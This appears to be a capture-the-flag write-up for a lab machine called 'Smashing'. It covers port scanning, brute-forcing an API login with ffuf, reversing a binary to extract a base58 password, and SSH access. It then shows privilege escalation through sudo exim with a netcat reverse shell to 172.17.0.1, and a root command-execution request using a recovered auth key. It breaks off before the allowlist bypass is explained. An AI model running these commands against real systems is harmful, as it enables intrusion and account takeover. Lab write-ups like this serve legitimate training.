![Screenshot](/hard/Smashing/Images/machine.png)

Difficulty: **Hard**

Made by: **Darksblack**

---
# Steps to pwn 🥽:
* 👁️  [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---
## 🛠️ Techniques: Enumeration with Gobuster, attacking an API, bruteforce with Ffuf, Enumerating subdomains, Download files, Analyse a binary with Ghidra and Radare2, Manipulate the binary with Radare2, Login with ssh, User pivoting by privilege of sudoer on the binary exim, Analyse python code, Port forwarding with chisel, RCE bypassing a "waf" and create a reverse shell
---

First of all we make sure that the machine is up, we can prove it with the command **ping**

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ ping 172.17.0.2 
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.230 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.136 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.136 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2041ms
rtt min/avg/max/mdev = 0.136/0.167/0.230/0.044 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

To start our reconnaissance phase, we use **nmap** to know what ports are open in the target.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-26 15:53 -0500
Initiating ARP Ping Scan at 15:53
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:53, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:53
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:53, 2.66s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000023s latency).
Scanned at 2026-06-26 15:53:33 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 3A:47:B4:42:26:09 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.98 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Argument        | Description                                                                                                                                                                           |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| -p-             | <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.                                                                       |
| -n              | With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.                                             |
| -sS             | With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.                      |
| --min-rate 5000 | <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.                                                                            |
| -Pn             | With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.                                   |
| -vv             | With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues. |
| --open          | With this argument we are telling to nmap to only filter the open ports.<br>                                                                                                          |

Once the scan concludes we can see 2 ports open:

- port 22 (ssh / Secure Shell)
- port 80 (http / Hyper-Text Transfer Protocol)

To know more about these ports like what services and versions are running on, we can use nmap once again to do this.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ nmap -p22,80 -Pn -n -sCV 172.17.0.2 -oX target.xml
```

| Argument       | Description                                                                                                                                                                                                                     |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| -p22,80        | With this argument nmap will only scan these 2 ports that we discover before.                                                                                                                                                   |
| -sCV           | With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports. |
| -oX target.xml | With this argument we save all the output that nmap give us and save it as a xml file.<br>                                                                                                                                      |

After the scan finish let's use **xsltproc** to convert this xml file to a html file, to see the result of the scan in a way more readable and pretty to the sight.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ xsltproc target.xml -o target.html && rm target.xml
```

And after doing this, we can open our browser to see the html file.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ open target.html
```

And we can see the following image:

![Screenshot](/hard/Smashing/Images/Image1.png)

We can see that is more pretty and readable at the sight.

We can notice that are trying to redirect to **cybersec.dl**, so this is virtual hosting, so we need to need to put the ip address of the target machine and the domain in **/etc/hosts** in the same line, something like this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ head -n 1 /etc/hosts
172.17.0.2      cybersec.dl
```

With this command we only want to see the first line of the file /etc/hosts

Now, let's use the command **whatweb** to see what technologies and versions are using the website.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ whatweb http://cybersec.dl
http://cybersec.dl [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Script, Title[CyberSec Corp], Werkzeug[2.2.2]
```

We can see that the website is using python so in python we can try an attack that is SSTI (Server Side Template Injection) that works on python, node, java, etc.

So it's worth trying to do this type of attack to this website if we can see the output of our input in the website.

Now, let's see the website, but before doing that, my method is always open an interceptor proxy, what am I talking about? I mean use **Burpsuite** or **Caido** to see the traffic of the client and the server of the website, in my case I use **Caido**.

Enough talk, let's open the website in our browser.

![Screenshot](/hard/Smashing/Images/Image2.png)

We can see this part of contact, but isn't do anything, and even the buttons are useless, but if we look to our proxy and we can see this:

![Screenshot](/hard/Smashing/Images/Image3.png)

We can see that a certain amount of time, makes a GET request to the API of the website to get a password, and we can see it the website so let's try to enumerate the API with **Gobuser**

---
# Enumeration

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ gobuster dir -u http://cybersec.dl/api -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cybersec.dl/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login                (Status: 405) [Size: 153]
Progress: 290 / 220559 (0.13%)^C
```

| Argument | Description                                                                                       |
| -------- | ------------------------------------------------------------------------------------------------- |
| dir      | With this parameter we want to enumerate directories to the website and files if we want to.      |
| -u       | With this argument we give the url of the website that we want to target.                         |
| -w       | With this argument we give a wordlist to gobuster to try to search possible directories or files. |

After that finish we can see a result, **login** so let's try to use **curl** to see the more in detail.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s http://cybersec.dl/api/login
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

And we can see that the method is allowed, per defect curl uses the method GET, to change it, we can use the parameter -X to change the method of the request.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s -X POST http://cybersec.dl/api/login 
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>Did not attempt to load JSON data because the request Content-Type was not &#39;application/json&#39;.</p>
```

We can see that it needs a header Content-Type in application json, so we can use the parameter **-H** to put this header.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s -X POST http://cybersec.dl/api/login -H 'Content-Type: application/json'
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>Failed to decode JSON object: Expecting value: line 1 column 1 (char 0)</p>
```

Okay it seems that it need data in a json format, so we can infer that the data that it needs is something like username and password to login with the api.

To do this we can send the data with the parameter **-d**

So let's try it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s -X POST http://cybersec.dl/api/login -H 'Content-Type: application/json' -d \               
> '{"username": "admin", "password": "admin"}'
{
  "message": "Invalid credentials"
}
```

So it seems that is valid, so we can try to brute force with a script of python or with ffuf, we can use a lot of tools here to try it, in my case I will do it with ffuf to brute force the password, your homework is doing a python script that brute force the password :p

```python
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ ffuf -X POST -u http://cybersec.dl/api/login -H 'Content-Type: application/json' -d \
'{"username": "admin", "password": "FUZZ"}' \
-w /usr/share/wordlists/rockyou.txt -c -fc 401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://cybersec.dl/api/login
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"username": "admin", "password": "FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 401
________________________________________________

undertaker              [Status: 200, Size: 650, Words: 76, Lines: 13, Duration: 129ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

In the part of data **FUZZ**, **ffuf** are going to replace that word to the words that are inside of the dictionary that we give in the parameter **-w**.

| Argument | Description                                                                                                                                        |
| -------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| -c       | With this argument we want that ffuf to have colours.                                                                                              |
| -fc 401  | With this argument we are telling to ffuf that we want filter the responses that his status code are 401 (forbidden).                              |
| -w       | In the part of data **FUZZ**, **ffuf** are going to replace that word to the words that are inside of the dictionary that we give in the argument. |

And we can see the result **undertaker** so it's password of admin.

Let's do a request with curl with this data.

```python
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s -X POST http://cybersec.dl/api/login -H 'Content-Type: application/json' -d \
'{"username": "admin", "password": "undertaker"}' | jq
{
  "company": {
    "URLs_web": "cybersec.dl, bin.cybersec.dl, mail.cybersec.dl, dev.cybersec.dl, cybersec.dl/downloads, internal-api.cybersec.dl, 0internal_down.cybersec.dl, internal.cybersec.dl, cybersec.dl/documents, cybersec.dl/api/cpu, cybersec.dl/api/login",
    "address": "New York, EEUU",
    "branches": "Brazil, Curacao, Lithuania, Luxembourg, Japan, Finland",
    "customers": "ADIDAS, COCACOLA, PEPSICO, Teltonika, Toray Industries, Weg, CURALINk",
    "name": "CyberSec Corp",
    "phone": "+1322302450134200",
    "services": "Auditorias de seguridad, Pentesting, Consultoria en ciberseguridad"
  },
  "message": "Login successful"
}
```

We can see a lot of subdomains and possible paths of the website, to only filter the URLs we can do it with jq, and even do a list with it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s -X POST http://cybersec.dl/api/login -H 'Content-Type: application/json' -d \
'{"username": "admin", "password": "undertaker"}' | jq '.company.URLs_web | split(", ")[]' -r
cybersec.dl
bin.cybersec.dl
mail.cybersec.dl
dev.cybersec.dl
cybersec.dl/downloads
internal-api.cybersec.dl
0internal_down.cybersec.dl
internal.cybersec.dl
cybersec.dl/documents
cybersec.dl/api/cpu
cybersec.dl/api/login
```

So we are only selecting the data of the company URLs_web and the data in raw (-r) to delete the double quotes and with split we are converting the coma and the space into a list, and we are calling the list with `[]`

So im saving this output into **paths.list**

Okay to validate if this urls are valid, functional or responsive let's save the subdomains that we see once again into **/etc/hosts**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ head -n1 /etc/hosts
172.17.0.2      cybersec.dl bin.cybersec.dl mail.cybersec.dl dev.cybersec.dl internal-api.cybersec.dl 0internal_down.cybersec.dl internal.cybersec.dl
```

Now let's see if these urls are valid, let's validate them with ffuf once again.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ ffuf -u 'http://FUZZ' -w paths.list -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ
 :: Wordlist         : FUZZ: /home/craft/challenges/dockerlabs/dificil/smashing/enumeration/paths.list
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

bin.cybersec.dl         [Status: 302, Size: 223, Words: 18, Lines: 6, Duration: 58ms]
cybersec.dl/api/login   [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 64ms]
internal-api.cybersec.dl [Status: 302, Size: 223, Words: 18, Lines: 6, Duration: 72ms]
dev.cybersec.dl         [Status: 302, Size: 223, Words: 18, Lines: 6, Duration: 122ms]
cybersec.dl             [Status: 200, Size: 7956, Words: 2235, Lines: 206, Duration: 118ms]
internal.cybersec.dl    [Status: 302, Size: 223, Words: 18, Lines: 6, Duration: 213ms]
0internal_down.cybersec.dl [Status: 200, Size: 2631, Words: 885, Lines: 98, Duration: 214ms]
mail.cybersec.dl        [Status: 200, Size: 2909, Words: 645, Lines: 116, Duration: 259ms]
:: Progress: [11/11] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

And we can discard the urls that given't a response and look the successful ones.

After looking the ones that are redirecting us, our traffic is being redirect to **cybersec.dl**.

So the interesting ones are **mail.cybersec.dl** and **0internal_down.cybersec.dl**.

So let's look the mail one, after one minute analysing it, is useless, so let's look the other subdomain.

And we can see this:

![Screenshot](/hard/Smashing/Images/Image4.png)

So let's download these files.

And let's read the note.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ cat smashing_note.txt 
De: flypsi
Para: Darksblack

Darksblack, necesito que me ayudes a recuperar mi password, te deje un binario para que lo analises y la extraigas, habia dejado mi password incorporada en el para
un CTF que estaba realizando pero perdi mis apuntes... (sisisisi ya se que me has dicho que no reutilice password, pero se me olvidan)
```

And we can see that it seems that the password of the user flypsi are inside of the binary, probably that is **smashing**.

---
# Exploitation

So let's see if the file is a executable file.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ file smashing
smashing: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3b7f42536642d56c9bf5ebcebeddc18d8336abe8, for GNU/Linux 3.2.0, not stripped
```

And we can see that is a executable binary of 64 bits, with dynamic libraries and it's not stripped, this means that the symbols of the binary contains his debug symbols so we can find the original names of the variables, functions, etc.

So let's give permissions of execution with chmod an let's execute it and see what it does.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ chmod +x smashing
 
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ ./smashing 
Bienvenido al programa interactivo.
Introduce tu nombre: craft
Hola, craft

¿Te gustaría saber datos interesantes sobre ciberseguridad? (si/no): si

Datos interesantes sobre ciberseguridad:
1. La mayoría de las violaciones de datos se deben a errores humanos.
2. El phishing es uno de los métodos más comunes de ataque.
3. La ciberseguridad es una industria en rápido crecimiento, con una demanda alta de profesionales.
4. Las contraseñas más comunes son increíblemente inseguras, como '123456' y 'password'.
5. El uso de autenticación de dos factores puede aumentar significativamente la seguridad.

Medidas de ciberseguridad recomendadas para un usuario promedio:
1. Utiliza contraseñas fuertes y únicas para cada cuenta.
2. Activa la autenticación de dos factores (2FA) siempre que sea posible.
3. Mantén tu sistema operativo y software actualizado.
4. Usa un software antivirus y realiza análisis periódicos.
5. Ten cuidado con los correos electrónicos y enlaces sospechosos (phishing).
6. Evita conectarte a redes Wi-Fi públicas sin protección.
7. Realiza copias de seguridad de tus datos importantes regularmente.
8. Configura la privacidad en tus redes sociales y revisa quién puede ver tu información.
9. Usa un gestor de contraseñas para almacenar y generar contraseñas seguras.
10. Desconfía de las ofertas demasiado buenas para ser verdad.
```

So it doesn't do to much.

Let's do some reversing with **Ghidra**, **Radare2**

After spending a lot of time and reversing, this binary is very confusing because it have a lot of functions that isn't being used and some are very complex, but the interesting one is the function factor1, why? it seems that is making a string, and union another string, and finally show the final string in the screen, here it's the function in pseudo code (ghidra):

```c
void factor1(void)

{
  long in_FS_OFFSET;
  char final_string [264];
  long local_10;
  
  <SNIP>
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  final_string[0xfd] = '\0';
  final_string[0xfe] = '\0';
  final_string[0xff] = '\0';
  strcat(final_string,a1209);
                    /* a1209 = DAT_00103427; "2tP" */
  strcat(final_string,b1210);
                    /* b1210 = DAT_0010342b; "42" */
  strcat(final_string,c1211);
                    /* c1211 = DAT_0010342e; "bS" */
  strcat(final_string,d1212);
                    /* d1212 = DAT_00103431; "zBTn" */
  strcat(final_string,e1213);
                    /* e1213 = s_mEAuA_00103436; "mEAuA" */
  strcat(final_string,f1214);
                    /* f1214 = DAT_0010343c; "Gk" */
  strcat(final_string,g1215);
                    /* g1215 = DAT_0010343f; "xj3" */
  printf("info: %s\n",final_string);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We can see some comments, that I put it, to explain those comments i'm going to show an image:

![Screenshot](/hard/Smashing/Images/Image5.png)

So the boxes (per example a1209) are redirecting us to DAT_XXX...

If you don't know those "variables" that are called DAT, is basically found data that found Ghidra isn't code, so It could be Int (numbers), str (string), etc.

After the DAT part is the address per example **DAT_00103427** so Ghidra are telling us that exist DATA in the ADDRESS 0x00103427.

Okay now let's explain the **strcat** function, this function are going to "union" two strings, to the 1st string, per example something like:

```c
void main(void)
{
	char string1[10];
	char string2[10];
	
	string1 = "Hello ";
	string2 = "World!";
	
	strcat(string1, string2); // "Hello " + "World!"
	
	printf("%s", string1); // Output: "Hello World!"
	
	return 0;
}
```

And strcat only accepts strings, not accepts another type of data.

So in resume we are constructing one string in the function **factor1**:  "2tP42bSzBTnmEAuAGkxj3"

To see if it's true, we can modify the assembly instruction of the binary **smashing** to call the function factor1 instead of factor2, we can do it with **Radare2**.

But first let's do a copy of the binary in case if we mess it up.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ cp smashing smashing.bkp
```

Okay now let's open the binary in write mode and analyse all the binary.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ r2 -w -c 'aaa' smashing
```

| Argument | Description                                                           |
| -------- | --------------------------------------------------------------------- |
| -w       | Activates the write mode                                              |
| -c 'aaa' | Execute a command: Analyse all the binary, functions, variables, etc. |

Now let's disassemble the main function

```r
[0x000011d0]> pdf@main
```

With pdf (Print Disassemble Function) we are going to see the assembly instructions of the main function.

![Screenshot](/hard/Smashing/Images/Image6.png)

Okay we can see the instruction and also the address of that instruction, we need to change our pointer to that address.

```r
[0x000011d0]> s 0x000023dc
[0x000023dc]>
```

With s, we can change our pointer address.

Now let's modify the assembly instruction.

```r
[0x000023dc]> wa call sym.factor1
INFO: Written 5 byte(s) (call sym.factor1) = wx e8c6fcffff @ 0x000023dc
```

wa stands for write assembly, so now we replaced factor2 to factor1, now let's exit of radare and execute the binary once again.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ ./smashing
Bienvenido al programa interactivo.
info: 2tP42bSzBTnmEAuAGkxj3
¿Te gustaría saber datos interesantes sobre ciberseguridad? (si/no):
```

And we can see the same string, so now let's decode it.

After trying multiple ciphers and encoders I found that this string is in base58, so let's decode it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ echo "2tP42bSzBTnmEAuAGkxj3" | base58 -d
Chocolate.1704
```

If you don't understand what we did, I make an animation to understand all what we did with the binary.

And we can see a possible password, maybe we can brute force this with the users that we got before (darksblack, flypsi) and login to ssh

After trying so much things, the correct user for login with ssh is flipsy, I don't know why is in this way, probably a misspelling or something like that.


```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ ssh flipsy@172.17.0.2 
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:KKC0BvIX7ivcjsD0MILwRiAwIJUwbagOYTaWqrNaLd8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
flipsy@172.17.0.2's password: 
Linux dockerlabs 6.19.14+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.14-1+kali1 (2026-05-05) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$
```

And we successfully login as the user flipsy.

---
# Privilege Escalation

Let's see if we have privileges of sudoers.

```r
$ sudo -l
Matching Defaults entries for flipsy on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User flipsy may run the following commands on dockerlabs:
    (darksblack) NOPASSWD: /usr/sbin/exim
```

And we can execute as the user **darksblack** the command **exim**.

So exim basically is a tool to administrate emails in the system.

With exim we can execute commands, with -be, what it does? Runs exim in testing mode, and execute a expansion item ($run) and show us the output of the command executed.

Let's try to run a command:

```r
$ sudo -u darksblack exim -be '${run{/bin/whoami}}'
darksblack
```

So now we can execute commands, let's make a reverse shell.

In our side let's execute **netcat** to receive the connection of the reverse shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ..
```

| Argument | Description                                                                                                    |
| -------- | -------------------------------------------------------------------------------------------------------------- |
| -l       | This argument makes to netcat to be in listening mode.                                                         |
| -v       | This argument activates the **verbose** mode, this will show us in more detail the connection that we receive. |
| -n       | This makes to netcat to skip the DNS lookup, and only uses the IP address directly.                            |
| -p       | The port we are in listening, can be any, if it's not being currently used.                                    |
Now let's execute the reverse shell.

```r
$ sudo -u darksblack exim -be '${run{/usr/bin/nc 172.17.0.1 1234 -e /bin/sh}}'
```

So we are using the netcat binary of the target machine to connect us with a sh shell.

And we receive this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 57482
whoami
darksblack
id
uid=1000(darksblack) gid=1000(darksblack) groups=1000(darksblack),100(users),1002(cyber)
```
Now let's do a treatment of this ugly terminal.

First of all we do this:

```r
script /dev/null -c sh
script /dev/null -c sh
Script started, output log file is '/dev/null'.
```

This command makes a new sh session with **script** and **/dev/null** as the output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c sh** makes script to run the shell with sh.

We do this because we want to use CTRL + C and more functions of sh.

When we execute this, we suspend our reverse shell for a moment with CTRL + Z.

then we execute the next command in our attack machine:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.


| Argument | Description                                                                                          |
| -------- | ---------------------------------------------------------------------------------------------------- |
| raw      | With raw we are making all the data of output and input to be as raw.                                |
| -echo    | With this we are making that if we execute a command it will not be printed again in the output.<br> |
| ; fg     | And with this we resume our reverse shell again.                                                     |

When we execute this command we reset the xterm:

```r
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. We can do this in the next way to be able to clear our screen if it get nasty:

```r
$ export TERM=xterm-256color
```

We can adjust the terminal to be more bigger with the following command:

```r
$ stty rows {num} columns {num}
```

and finally it looks way better!

After trying to escalate privileges in multiple ways our current user (darksblack), is in the group of **cyber**.

```r
$ id
uid=1000(darksblack) gid=1000(darksblack) groups=1000(darksblack),100(users),1002(cyber)
```

As we can see here we can try to find files that the group cyber have access, we can do it with the command **find**.

```r
$ find / -group cyber 2>/dev/null  
/var/www/html/serverpi.py
```

And we can find this python file, let's take a look.

```python
$ cat /var/www/html/serverpi.py
import base64; p0o = "aW1wb3J0IGh0dHAuc <SNIP> mVyKCkK"; p1tr = base64.b64decode(p0o.encode()).decode(); exec(p1tr)
```

This python script basically is decoding the string in base64 and then execute it with python, so let's copy the content and let's save it in our own machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ echo "aW1wb3J0IGh0dHAuc2VydmV <SNIP> KCkK" | base64 -d > serverpi.py
```

After analysing the script these are the important parts:

```python
import http.server
import socketserver
import urllib.parse
import subprocess
import base64

PORT = 25000

AUTH_KEY_BASE64 = "MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo="

	if 'exec' in query_params:
            command = query_params['exec'][0]
            try:
                allowed_commands = ['ls', 'whoami']
                if not any(command.startswith(cmd) for cmd in allowed_commands):
                    self.send_response(403)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"Command not allowed.")
                    return

                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(result)
```

So basically exists a web server in the machine in the port 25,000 and we can execute commands only if we give a parameter **exec** only if the server receives the Auth key in base64, AND only executes the command if the value of the parameter exec starts with **ls** or with **whoami**.

To verify this, let's check if exists this server.

Let's execute **ss** to find if the port 25000 is currently being used.

```r
$ ss -tuln
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                        Peer Address:Port                   Process                   
tcp                     LISTEN                   0                        128                                              0.0.0.0:80                                               0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                               0.0.0.0:*                                                
tcp                     LISTEN                   0                        5                                              127.0.0.1:25000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                                 [::]:22                                                  [::]:*
```

And we can see that the port 25000 is being used in the LOCAL machine.

Let's make a request with curl if it is a web server.

```r
$ curl http://localhost:25000; echo  
Authorization header is missing or incorrect
```

And we can see that's exactly the same page, let's see what user is running this process 

```r
$ ps aux | grep serverpi
root           1  0.0  0.0   2584   392 ?        Ss   Jun27   0:00 /bin/sh -c service ssh start &&     python3 /var/www/html/serverpi.py &     python3 /opt/cybersecurity_company/app.py &     tail -f /dev/null
root           7  0.0  0.1  24676  6372 ?        S    Jun27   0:07 python3 /var/www/html/serverpi.py
```

The user root are running the server! so if we execute commands we execute it as the user root.

So let's do port forwarding, because doing requests with curl in the target machine is kinda annoying.

Let's use chisel to mount a server, so im going to share the file with scp and the credentials of the user flipsy

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ scp /usr/bin/chisel flipsy@172.17.0.2:/tmp
flipsy@172.17.0.2's password: 
chisel                                                                              100%   10MB  19.0MB/s   00:00
```

alright so now let's mount the server in our attack machine.

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ chisel server --reverse -p 1111
2026/06/27 19:17:13 server: Reverse tunnelling enabled
2026/06/27 19:17:13 server: Fingerprint TQ62UQFBZyqn0BE26vMdrW2bnXcBUT4p6QsYzLcOOdQ=
2026/06/27 19:17:13 server: Listening on http://0.0.0.0:1111
```

| Argument  | Description                                                                                   |
| --------- | --------------------------------------------------------------------------------------------- |
| --reverse | With this, we are going the receive the connection of the clients that we receive in reverse. |
| -p        | The port to listen on.                                                                        |

Okay now in the target machine let's reverse the port 25000 with chisel and connect as a client.

```r
$ cd /tmp
$ ./chisel client 172.17.0.1:1111 R:25000 & 
$ 2026/06/28 00:19:25 client: Connecting to ws://172.17.0.1:1111
2026/06/28 00:19:25 client: Connected (Latency 887.887µs)
```

| Argument | Description                                                       |
| -------- | ----------------------------------------------------------------- |
| R:25000  | We are redirect the connection to this port of the local machine. |
| &        | This ampersand is for run chisel in the background.               |
And we can receive this in our chisel server:

```c
2026/06/27 19:19:25 server: session#1: tun: proxy#R:25000=>25000: Listening
```

Okay now in the target machine let's see if we can connect.

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ curl http://localhost:25000
Authorization header is missing or incorrect
```

Great! Now let's try to execute a command with the Auth key, including the header with -H and the parameter to execute the command.

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ curl -s http://localhost:25000?exec=whoami -H 'Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo='
root
```

Great! Now we can execute commands, but we have a restriction. Why? because there is a list of allowing commands, but we can bypass this.

Because the script checks if the exec parameter in the url starts with one of the allowed commands, you get it?

